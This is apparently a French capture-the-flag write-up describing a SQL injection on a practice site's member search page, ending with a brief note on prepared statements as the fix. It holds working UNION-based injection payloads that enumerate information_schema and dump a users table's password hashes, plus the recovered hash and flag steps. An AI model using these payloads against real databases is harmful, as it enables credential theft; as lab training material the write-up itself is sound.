L'injection SQL, est une faille de sécurité d'une application interagissant avec une base de données. Elle permet d'injecter dans la requête SQL en cours un morceau de requête non prévu par le système et pouvant en compromettre la sécurité.

Dans la section MEMBER du site on peut voir que le champ de saisie nous permet d'injecter du code SQL: "Unknown column 'saf' in 'where clause'".
On peut donc utiliser une "UNION attack" pour récupérer les informations sur la structure de la base de données.

On peut récupérer le nom des tables avec :
- "1 AND 1=2 UNION SELECT table_schema, table_name, 1 FROM information_schema.tables"

On s'aperçoit alors que la seule table accessible par le schéma "Member_Sql_Injection" est la table "USERS".

Avec :
- 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns

On peut lister les noms des colonnes pour toutes les tables d'information_schema, et donc en cherchant la table USERS on trouve les colonnes:
user_id, first_name, last_name, town, country, planet, Commentaire, countersign.

En utilisant les colonnes countersign et commentaire avec:
- 1 AND 1=2 UNION SELECT countersign, commentaire FROM users

On récupère:
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !

Après décryptage et encryptage en sha256 du mot de passe on récupère le flag !


On peut eviter cette faille en stockant les inputs de l'utilisateur dans une variable et en preparant a l'avance la requet SQL
